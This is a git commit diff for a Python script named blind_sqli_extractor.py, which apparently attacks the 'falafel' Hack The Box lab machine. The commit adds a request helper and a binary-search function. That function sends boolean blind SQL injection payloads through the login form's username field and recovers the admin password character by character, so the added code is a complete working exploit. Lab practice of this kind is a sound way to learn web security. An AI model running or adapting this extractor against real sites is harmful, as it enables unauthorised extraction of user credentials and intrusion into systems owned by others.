8ae1304fa6e6434892565174b490768a2033f4d5
Yuriy Palikshanov <106527465+MikeDakotaStayTrue@users.noreply.github.com>
2024-01-04 17:11:54 +0300

    add binary search

--- blind_sqli_extractor.py
+++ blind_sqli_extractor.py
@@ -1,9 +1,21 @@
 import requests
 import urllib
 
-
+# Data
 proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}
 lab_url = "http://falafel.htb/login.php"
+
+
+def send_request(sql_string):
+    session = requests.Session()
+
+    data = {'username': sql_string, 'password':'pass'}
+    
+    req = requests.Request('POST', lab_url, data=data)
+    prep = session.prepare_request(req)
+    prep.body = urllib.parse.unquote(prep.body)
+    prep.headers['Content-length'] = len(prep.body)
+    return session.send(prep, proxies=proxies)
 
 
 def extract_tables():
@@ -81,9 +93,44 @@ def extract_user_passwords():
         if stop_extract == True:
             break
 
+def binary_extract_passwords():
+
+    password = ""
+
+    for indx in range(1, 40):
+
+        left = 47
+        right = 123
+
+        while left <= right:
+
+            cursor = left + (right - left) // 2
+
+            # Check cursor (middle)
+            sql_string = "admin'+and+ASCII(SUBSTRING(password,{},1))={}--+-".format(indx, cursor)
+            resp = send_request(sql_string)
+
+            if "Wrong identification" in resp.text:
+                password = password + chr(cursor)
+                print(password)
+                break
+
+            # Сheck sides
+            sql_string = "admin'+and+ASCII(SUBSTRING(password,{},1))>{}--+-".format(indx, cursor)
+            resp = send_request(sql_string)
+
+            if "Wrong identification" in resp.text:
+                left = cursor + 1
+            else:
+                right = cursor - 1
+            
+        
+
+
 def main():
     # extract_tables()
-    extract_user_passwords()
+    # extract_user_passwords()
+    binary_extract_passwords()
     
 
 if __name__ == "__main__":
